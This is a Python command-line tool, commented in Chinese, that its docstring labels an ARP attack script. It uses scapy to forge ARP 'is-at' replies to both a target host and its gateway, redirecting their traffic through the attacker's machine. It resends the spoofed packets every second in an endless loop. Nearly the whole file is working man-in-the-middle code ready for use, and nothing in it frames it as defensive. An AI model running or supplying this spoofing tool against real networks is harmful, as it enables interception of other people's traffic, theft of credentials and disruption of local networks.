#!/usr/bin/python3
# -*- coding: utf-8 -*-
'''
ARP 攻击脚本
'''
 
import argparse
import threading
import time
 
from scapy.all import ARP, Ether, get_if_hwaddr, sendp
from scapy.layers.l2 import getmacbyip
 
 
# 注意这里面的几个方法
 
# Ether用来构建以太网数据包
# ARP是构建ARP数据包的类
# sendp方法在第二层发送数据包
# getmacbyip方法用于通过ip获取mac地址
# get_if_hwaddr方法获取指定网卡的mac地址
 
def get_mac(tgt_ip):
    '''
    调用scapy的getmacbyip函数，获取攻击目标IP的MAC地址。
    '''
    tgt_mac = getmacbyip(tgt_ip)
    if tgt_mac is not None:
        return tgt_mac
    else:
        print("无法获取IP为：%s 主机的MAC地址，请检查目标IP是否存活"%tgt_ip)
 
 
def create_arp_station(src_mac, tgt_mac, gateway_ip, tgt_ip):
    '''
    生成ARP数据包，伪造网关欺骗目标计算机
    src_mac:本机的MAC地址，充当中间人
    tgt_mac:目标计算机的MAC
    gateway_ip:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    tgt_ip:目标计算机的IP
    op=is-at,表示ARP响应
    '''
    eth = Ether(src=src_mac, dst=tgt_mac)
    arp = ARP(hwsrc=src_mac, psrc=gateway_ip, hwdst=tgt_mac, pdst=tgt_ip, op="is-at")
    pkt = eth / arp
    return pkt
 
def create_arp_gateway(src_mac, gateway_mac, tgt_ip, gateway_ip):
    '''
    生成ARP数据包，伪造目标计算机欺骗网关
    src_mac:本机的MAC地址，充当中间人
    gateway_mac:网关的MAC
    tgt_ip:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击
    gateway_ip:网关的IP
    op=is-at,表示ARP响应
    '''
    eth = Ether(src=src_mac, dst=gateway_mac)
    arp = ARP(hwsrc=src_mac, psrc=tgt_ip, hwdst=gateway_mac, pdst=gateway_ip, op="is-at")
    pkt = eth / arp
    return pkt
 
 
def main():
    """
    主方法
    """
    description = "ARP攻击脚本"
    parser = argparse.ArgumentParser(description=description)
 
    parser.add_argument('-sm', dest='srcmac', type=str, help='发送源计算机的MAC，如果不提供，默认将采用本机的MAC地址')
    parser.add_argument('-t', dest='targetip', type=str, help='指定目标计算机IP', required=True)
    parser.add_argument('-tm', dest='targetmac', type=str, help='指定目标计算机MAC，如果不提供，默认将根据其IP获取MAC地址')
    parser.add_argument('-g', dest='gatewayip', type=str, help='指定网关IP', required=True)
    parser.add_argument('-gm', dest='gatewaymac', type=str, help='指定网关MAC，如果不提供，默认将根据其IP获取MAC地址')
    parser.add_argument('-i', dest='interface', type=str, help='指定使用的网卡', required=True)
    parser.add_argument('-a', dest='allarp', action='store_true', help='是否进行全网arp欺骗')
 
    args = parser.parse_args()
 
    tgt_ip = args.targetip
    gateway_ip = args.gatewayip
    interface = args.interface
 
    srcmac = args.srcmac
    targetmac = args.targetmac
    gatewaymac = args.gatewaymac
 
    if tgt_ip is None or gateway_ip is None or interface is None:
        print(parser.print_help())
        exit(0)
 
    src_mac = srcmac
    if src_mac is None:
        src_mac = get_if_hwaddr(interface)
 
    print('本机MAC地址是：', src_mac)
    print("目标计算机IP地址是：", tgt_ip)
 
    tgt_mac = targetmac
    if tgt_mac is None:
        tgt_mac = get_mac(tgt_ip)
 
    print("目标计算机MAC地址是：", tgt_mac)
    print("网关IP地址是：", gateway_ip)
 
    gateway_mac = gatewaymac
    if gateway_mac is None:
        gateway_mac = get_mac(gateway_ip)
 
    print("网关MAC地址是：", gateway_mac)
 
    input('按任意键继续：')
 
    pkt_station = create_arp_station(src_mac, tgt_mac, gateway_ip, tgt_ip)
    pkt_gateway = create_arp_gateway(src_mac, gateway_mac, tgt_ip, gateway_ip)

    # 如果不展示发送情况的话下面的语句可以更加简便直接用sendp方法提供的功能循环发送即可，不需要多线程和死循环。
    # sendp(pkt_station, inter=1, loop=1)
    # sendp(pkt_gateway, inter=1, loop=1)

    i = 1
    while True:
        t = threading.Thread(
            target=sendp,
            args=(pkt_station,),
            kwargs={'inter':1, 'iface':interface}
        )
        t.start()
        t.join()
        print(str(i) + " [*]发送一个计算机ARP欺骗包")
 
        s = threading.Thread(
            target=sendp,
            args=(pkt_gateway,),
            kwargs={'inter':1, 'iface':interface}
        )
        s.start()
        s.join()
 
        print(str(i) + " [*]发送一个网关ARP欺骗包")
        i += 1
        time.sleep(1)
 
if __name__ == '__main__':
    main()